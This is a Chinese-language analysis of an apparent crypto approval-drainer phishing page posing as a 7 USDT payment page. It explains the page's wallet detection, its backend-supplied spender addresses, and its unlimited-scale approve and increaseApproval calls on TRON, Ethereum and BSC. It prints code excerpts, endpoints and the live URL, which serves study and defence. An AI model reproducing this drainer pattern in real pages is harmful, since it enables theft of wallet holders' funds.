# `pay.tp18.vip` 授权页逻辑分析

分析目标页面：

- `https://pay.tp18.vip/sc/zhanghao/7774498987560/7/pay`

页面标题：

- `付款`

## 1. 页面整体用途

这个页面不是普通的收银台，也不是单纯跳转到钱包 App 的 Deeplink 页面。

它的核心逻辑是：

1. 识别当前浏览器环境中注入的钱包对象
2. 判断当前连接的是哪条链
3. 向后端请求“被授权地址”
4. 在用户点击“立即支付”并确认后
5. 发起链上的 `approve(...)` 或 `increaseApproval(...)` 授权交易
6. 将授权结果通过接口回传后端

从前端行为看，本质是一个“USDT 授权页”。

## 1.1 它是不是纯静态页面

不是。

更准确地说，这个目标页由 3 层组成：

1. 前端静态资源层
   页面本身的 HTML、CSS、JS 是静态资源。
2. 后端业务接口层
   页面依赖多个接口返回动态数据和状态判断结果。
3. 链上交互层
   页面通过钱包注入对象直接发起链上授权交易。

所以它不是“只有前端、没有后端”的纯静态页面。

## 1.2 三层调用关系

可以把这个页面理解为下面这个调用链：

```txt
用户点击页面
  -> 前端脚本识别钱包与链
  -> 前端请求后端接口
  -> 后端返回动态授权目标地址 / 状态
  -> 前端调用钱包注入对象
  -> 钱包发链上 approve / increaseApproval
  -> 前端再把结果回传后端
```

更细一点：

```txt
Browser Page
  -> window.ethereum / window.tronWeb / window.okxwallet / ...
  -> /query_bl
  -> /get_contract_address
  -> approve(...) 或 increaseApproval(...)
  -> /success_callback 或 /add_bl
```

## 2. 支持的链

前端代码中一共处理 3 条链：

1. `tron`
2. `eth`
3. `bsc`

对应的 USDT 合约地址：

| 链 | 变量名 | 合约地址 |
| --- | --- | --- |
| TRON | `tron_contract_address` | `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t` |
| Ethereum | `eth_contract_address` | `0xdAC17F958D2ee523a2206206994597C13D831ec7` |
| BSC | `bsc_contract_address` | `0x55d398326f99059ff775485246999027b3197955` |

页面有两个切链入口：

- `?net=tron`
- `?net=eth`

其中 `?net=eth` 实际覆盖 EVM 场景，再根据链 ID 细分：

- `0x1` -> `eth`
- `0x38` -> `bsc`

## 3. 页面初始化流程

页面加载后执行 `window.addEventListener("load", async function () { ... })`。

初始化流程如下：

1. 识别钱包类型
2. 识别链类型
3. 获取账户地址
4. 根据链切换页面上展示的“合约地址”
5. 调用黑名单查询接口
6. 调用后端接口获取动态授权目标地址

关键后端接口：

- `/query_bl?address=...`
- `/get_contract_address?address=...`
- `/success_callback?address=...&approved=...&approve_type=...&chain=...&site=...`
- `/add_bl?address=...`

关键状态变量：

- `wallet`
- `chain`
- `address`
- `accounts`
- `approve_address`
- `push`

## 3.1 页面资源与业务逻辑的边界

如果只看资源形式，这页确实像“静态页”：

- 一个 HTML 文档
- 若干 CSS
- `/static/js/abi.js`
- `/static/js/web3.min.js`

但只要看运行时行为，就能确认它不是纯静态：

- 页面会根据钱包环境动态判断链和账户
- 页面会向后端请求黑名单状态
- 页面会向后端请求实际的授权目标地址
- 页面会把链上结果再回调到后端

这意味着：

- 前端只负责“识别 + 展示 + 发起交易 + 回传”
- 真正控制授权目标地址和部分页面行为的是后端

## 4. 钱包识别逻辑

页面通过检查全局对象来识别钱包：

| 条件 | 钱包标识 |
| --- | --- |
| `window.imToken` | `imtoken` |
| `window.tokenpocket` | `tp` |
| `window.okxwallet` | `okx` |
| `window.trustwallet` | `trust` |
| `window.bitkeep` | `bitkeep` |
| `window.tronLink` | `tronlink` |
| `window.tronWeb` | `tronweb` |
| `window.ethereum.isMetaMask` | `metamask` |
| 其他 `window.ethereum` | `web3` |

获取账户时会调用：

- `ethereum.request({ method: 'eth_requestAccounts' })`
- `window.okxwallet.request({ method: 'eth_requestAccounts' })`
- `window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' })`
- `tronLink.request({ method: 'tron_requestAccounts' })`

## 5. 点击“立即支付”后的逻辑

按钮事件入口：

- `is.addEventListener('click', async () => { ... })`

执行顺序：

1. 如果既没有 `address` 也没有 `accounts`，直接刷新页面
2. 如果 `approve_address.length >= 3`
3. 调用 `checkCurrentAllowance(userAddr, spenderAddr)`
4. 对 TRON 当前授权额度做检查
5. 如果当前额度大于等于 `5000000 * 1e6`，弹失败提示
6. 否则显示弹窗
7. 点“确认”后调用 `pay()`

当前额度检查函数：

```js
async function checkCurrentAllowance(userAddress, spenderAddress) {
  if (chain === 'tron') {
    const contract = await tronWeb.contract().at(tron_contract_address);
    const allowance = await contract.allowance(userAddress, spenderAddress).call();
    return allowance;
  }
  return 0;
}
```

注意：

- 这里额度校验只对 `tron` 明确实现
- `eth` / `bsc` 没有等价的前端额度检查逻辑

## 6. 交易主分发函数

真正发起钱包调用的主入口是：

```js
async function pay() { ... }
```

它先按钱包类型分发，再按链继续分发。

### 钱包 + 链 -> 调用函数

| 钱包 | tron | eth | bsc |
| --- | --- | --- | --- |
| okx | `okx_tron()` | `okx_eth()` | `okx_bsc()` |
| imtoken | `imtoken_tron()` | `imtoken_eth()` | `imtoken_bsc()` |
| tp | `tp_tron()` | `tp_eth()` | `tp_bsc()` |
| trust | - | `trust_eth()` | `trust_bsc()` |
| bitkeep | `bitkeep_tron()` | `bitkeep_eth()` | `bitkeep_bsc()` |
| metamask | - | `metamask_eth()` | `metamask_bsc()` |
| tronlink | `tronlink_tron()` | - | - |
| tronweb | `tp_tron()` | - | - |
| web3 | - | `metamask_eth()` | `metamask_bsc()` |

## 7. 合约调用方式

### 7.1 TRON

TRON 侧主要调用：

- `allowance(address,address)`
- `increaseApproval(address,uint256)`

调用方式：

```js
let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
  tron_contract_address,
  'increaseApproval(address,uint256)',
  { feeLimit: 100000000 },
  [
    { type: 'address', value: approve_address[0] },
    { type: 'uint256', value: '...' }
  ],
  address
);

let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
let result = tronWeb.trx.sendRawTransaction(signed_tx);
```

相关函数：

- `okx_tron()`
- `imtoken_tron()`
- `tp_tron()`
- `bitkeep_tron()`
- `tronlink_tron()`

### 7.2 Ethereum

Ethereum 侧主要调用：

- `approve(address,uint256)`

调用方式：

```js
let web3 = new Web3(window.ethereum);
let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);

contract.methods.approve(
  approve_address[1],
  '...'
).send({ from: accounts[0] });
```

相关函数：

- `okx_eth()`
- `imtoken_eth()`
- `tp_eth()`
- `trust_eth()`
- `bitkeep_eth()`
- `metamask_eth()`

### 7.3 BSC

BSC 侧主要调用：

- `approve(address,uint256)`

调用方式：

```js
let web3 = new Web3(window.ethereum);
let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);

contract.methods.approve(
  approve_address[2],
  '...'
).send({ from: accounts[0] });
```

相关函数：

- `okx_bsc()`
- `imtoken_bsc()`
- `tp_bsc()`
- `trust_bsc()`
- `bitkeep_bsc()`
- `metamask_bsc()`

## 8. 授权额度特征

页面显示的金额是 `7`，但前端真正发起的授权额度不是单纯 `7 USDT`。

不同钱包/链分支里出现了多种较大的授权值，例如：

- `999999999999999999999999999999999999999999999999999999999999999999999`
- `123456789123456789123456789`
- `123456789123456789123456789123456789`
- TRON 上若干固定十六进制大数

这说明前端的关键动作不是单笔支付，而是“对某个动态地址做授权”。

## 9. 动态授权目标地址

前端不会把真正的 `spender` 写死在页面里，而是通过接口动态获取：

```js
let res = await get_contract_address(address || getFirstElementOrItself(accounts));
approve_address = res.address;
push = res.p;
```

这里推断：

- `approve_address[0]` -> TRON 授权目标地址
- `approve_address[1]` -> ETH 授权目标地址
- `approve_address[2]` -> BSC 授权目标地址

这个推断来自调用分支与数组下标的对应关系。

## 10. 后端回调接口

授权交易发送后，会调：

```js
await success_callback(address, approved, type);
```

其中会请求：

```txt
/success_callback?address=...&approved=...&approve_type=...&chain=...&site=...
```

当 `push` 为假时，还会走：

```txt
/add_bl?address=...
```

相关参数：

- `address`: 用户地址
- `approved`: 被授权地址
- `approve_type`: 类型值
- `chain`: 当前链
- `site`: `zhanghao`

## 10.1 后端接口在整条链路里的职责

从前端代码可推断：

| 接口 | 作用 |
| --- | --- |
| `/query_bl` | 查询地址是否命中某种黑名单/封禁逻辑 |
| `/get_contract_address` | 返回当前用户对应的动态授权目标地址数组 |
| `/success_callback` | 接收前端上报的授权结果 |
| `/add_bl` | 在某些分支下把地址加入后端侧名单 |

因此后端至少承担了 3 个职责：

1. 动态决定授权目标地址
2. 决定哪些地址可以继续流程
3. 接收链上操作后的结果通知

如果没有后端，这个页面最关键的两个变量将无法工作：

- `approve_address`
- `push`

## 11. 前端上的异常和可疑点

### 11.1 文案和链上行为不一致

页面名义上是“付款”，但核心动作是授权，不是直接转账。

### 11.2 成功回调里也提示失败

`success_callback()` 中无论某些分支返回什么，弹窗都可能是：

- `付款失败，请尝试使用其他钱包！`
- `付款失败！`

这意味着 UI 文案不能直接反映真实链上行为。

### 11.3 真正关键的是授权是否发出

对这个页面来说，更关键的是：

- 是否识别到钱包
- 是否拿到账户
- 是否从后端拿到 `approve_address`
- 是否调用了 `approve` / `increaseApproval`

## 12. 最小技术摘要

如果要给其他 AI 一个最短结论，可以直接用下面这段：

```txt
这个页面是一个多钱包、多链的 USDT 授权页。
前端会识别钱包环境（imToken / TokenPocket / OKX / Trust / BitKeep / MetaMask / TronLink 等），
再识别链（TRON / ETH / BSC），
然后从后端接口 /get_contract_address 动态获取被授权地址 approve_address。

点击“立即支付”后并不是直接转账，而是弹出授权确认框，
最终在不同钱包和链的分支里调用：
- TRON: increaseApproval(address,uint256)
- ETH: approve(address,uint256)
- BSC: approve(address,uint256)

交易发送成功后，再通过 /success_callback 把结果回传后端。
页面显示的金额是 7，但实际授权额度是更大的固定值或超大值，不等于单笔 7 USDT 支付。
```

## 13. 给其他 AI 的快速判断模板

如果要把这页交给其他 AI 做进一步分析，推荐直接附上下面这个判断模板：

```txt
这不是纯静态支付页，而是“前端静态资源 + 后端动态接口 + 链上授权调用”的三层结构页面。

前端职责：
- 识别钱包
- 识别链
- 展示弹窗
- 发起 approve / increaseApproval
- 回传结果

后端职责：
- 返回动态授权目标地址 approve_address
- 返回黑名单/状态判断
- 接收 success_callback

链上职责：
- TRON 调用 increaseApproval(address,uint256)
- ETH 调用 approve(address,uint256)
- BSC 调用 approve(address,uint256)

因此不能把它简单归类成“只有 HTML/JS 的纯前端页面”。
```
